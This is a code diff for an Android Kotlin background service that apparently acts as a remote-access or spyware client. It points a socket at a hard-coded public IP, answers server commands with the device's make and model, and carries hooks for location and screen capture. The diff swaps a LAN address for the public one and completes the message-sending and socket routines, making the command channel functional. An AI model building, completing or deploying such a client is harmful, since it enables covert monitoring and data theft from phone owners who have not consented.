@@ -3,10 +3,7 @@ package com.example.socketclient
 import android.app.*
 import android.content.Context
 import android.content.Intent
-import android.graphics.Bitmap
-import android.graphics.PixelFormat
 import android.graphics.Point
-import android.hardware.display.DisplayManager
 import android.hardware.display.VirtualDisplay
 import android.location.Location
 import android.location.LocationManager
@@ -26,7 +23,7 @@ import kotlin.concurrent.thread
 class SocketService : Service() {
 
     companion object {
-        const val SERVER_IP = "192.168.0.178"
+        const val SERVER_IP = "197.251.240.87"
         const val SERVER_PORT = 54835
         const val CHANNEL_ID = "SocketServiceChannel"
         const val NOTIFICATION_ID = 2
@@ -52,7 +49,6 @@ class SocketService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // ✅ Added safety check to prevent crashes if intent is null
         if (intent == null) {
             Log.e(TAG, "Null intent received — stopping service safely")
             stopSelf()
@@ -183,8 +179,7 @@ class SocketService : Service() {
 
     private fun handleCommand(data: String) {
         try {
-            val tokens = data.split(DELIMITER)
-            val cmd = tokens[0].trim()
+            val cmd = data.trim()
             when (cmd) {
                 "~" -> sendData("~$DELIMITER${android.os.Build.MANUFACTURER}/${android.os.Build.MODEL}$DELIMITER")
                 "!" -> {
@@ -234,19 +229,33 @@ class SocketService : Service() {
     }
 
     private fun startScreenCapture() {
-        // TODO: Place your existing screen capture implementation here.
+        // Placeholder for your MediaProjection capture logic
+        sendData("@${DELIMITER}Screen capture not implemented$DELIMITER")
     }
 
-    private fun sendBytesWithLength(data: ByteArray) {
-        // TODO: Your existing byte-sending implementation here.
-    }
-
+    @Synchronized
     private fun sendData(message: String) {
-        // TODO: Your existing sendData implementation here.
+        try {
+            if (dataOut != null) {
+                val fullMessage = message + DELIMITER
+                dataOut?.write(fullMessage.toByteArray(Charsets.UTF_8))
+                dataOut?.flush()
+                Log.d(TAG, "Sent: $fullMessage")
+            } else {
+                Log.e(TAG, "DataOutputStream is null, cannot send message")
+            }
+        } catch (e: IOException) {
+            Log.e(TAG, "Error sending data: ${e.message}", e)
+            safeCloseSocket()
+        }
     }
 
     private fun safeCloseSocket() {
-        // TODO: Your existing safe socket-closing implementation here.
+        try { dataOut?.close() } catch (e: Exception) { Log.e(TAG, "Error closing DataOutputStream: ${e.message}", e) }
+        try { socket?.close() } catch (e: Exception) { Log.e(TAG, "Error closing socket: ${e.message}", e) }
+        socket = null
+        dataOut = null
+        Log.d(TAG, "Socket and stream closed safely")
     }
 
     override fun onDestroy() {
